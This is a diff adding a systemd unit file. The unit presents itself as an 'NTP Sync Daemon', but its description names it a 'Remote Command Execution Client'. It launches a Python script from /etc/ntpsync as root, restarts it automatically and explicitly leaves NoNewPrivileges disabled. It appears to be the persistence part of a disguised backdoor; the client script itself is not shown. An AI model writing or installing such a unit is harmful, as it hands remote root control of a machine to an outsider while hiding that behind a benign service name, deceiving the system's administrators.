@@ -1,0 +1,22 @@
+[Unit]
+Description=NTP Sync Daemon (Remote Command Execution Client)
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/etc/ntpsync
+ExecStart=/usr/bin/python3 /etc/ntpsync/ntp
+Restart=always
+RestartSec=5
+StandardOutput=journal
+StandardError=journal
+
+# Security settings
+NoNewPrivileges=false
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
+
